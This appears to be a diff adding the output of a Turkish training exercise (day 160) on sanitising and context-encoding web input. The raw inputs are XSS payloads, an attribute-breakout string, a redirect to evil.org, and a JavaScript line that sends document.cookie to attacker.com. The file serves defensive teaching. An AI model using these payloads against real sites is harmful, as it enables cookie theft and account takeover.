@@ -1,0 +1,38 @@
+GÜN 160: ARINDIRILMIŞ VE BAĞLAMSAL KODLANMIŞ GÜVENLİ ÇIKTI ÖRNEKLERİ
+================================================================================
+[*] Ham Girdi: <script>alert(document.cookie)</script>
+    Hedef Bağlam: html_body
+    Tespit Edilen Bulgu: 1 adet
+    Arındırılmış HTML: alert(document.cookie)
+    Bağlamsal Kodlanmış Çıktı: &lt;script&gt;alert(document.cookie)&lt;/script&gt;
+------------------------------------------------------------
+[*] Ham Girdi: <img src=x onerror=alert(1)>
+    Hedef Bağlam: html_body
+    Tespit Edilen Bulgu: 1 adet
+    Arındırılmış HTML: 
+    Bağlamsal Kodlanmış Çıktı: &lt;img src=x onerror=alert(1)&gt;
+------------------------------------------------------------
+[*] Ham Girdi: <a href="javascript:evil()">Tıkla</a>
+    Hedef Bağlam: html_body
+    Tespit Edilen Bulgu: 1 adet
+    Arındırılmış HTML: <a>Tıkla</a>
+    Bağlamsal Kodlanmış Çıktı: &lt;a href=&quot;javascript:evil()&quot;&gt;Tıkla&lt;/a&gt;
+------------------------------------------------------------
+[*] Ham Girdi: admin' OR '1'='1' " onfocus="alert(1)
+    Hedef Bağlam: html_attribute
+    Tespit Edilen Bulgu: 1 adet
+    Arındırılmış HTML: admin' OR '1'='1' " onfocus="alert(1)
+    Bağlamsal Kodlanmış Çıktı: admin&#x27;&#x20;OR&#x20;&#x27;1&#x27;&#x3D;&#x27;1&#x27;&#x20;&#x22;&#x20;onfocus&#x3D;&#x22;alert&#x28;1&#x29;
+------------------------------------------------------------
+[*] Ham Girdi: '; document.location='https://attacker.com?c='+document.cookie; //
+    Hedef Bağlam: javascript
+    Tespit Edilen Bulgu: 0 adet
+    Arındırılmış HTML: '; document.location='https://attacker.com?c='+document.cookie; //
+    Bağlamsal Kodlanmış Çıktı: \u0027\u003b document.location\u003d\u0027https\u003a\u002f\u002fattacker.com\u003fc\u003d\u0027\u002bdocument.cookie\u003b \u002f\u002f
+------------------------------------------------------------
+[*] Ham Girdi: param=değer&redirect=https://evil.org?q=1 2 3
+    Hedef Bağlam: uri_param
+    Tespit Edilen Bulgu: 0 adet
+    Arındırılmış HTML: param=değer&amp;redirect=https://evil.org?q=1 2 3
+    Bağlamsal Kodlanmış Çıktı: param%3Dde%C4%9Fer%26redirect%3Dhttps%3A%2F%2Fevil.org%3Fq%3D1%202%203
+------------------------------------------------------------
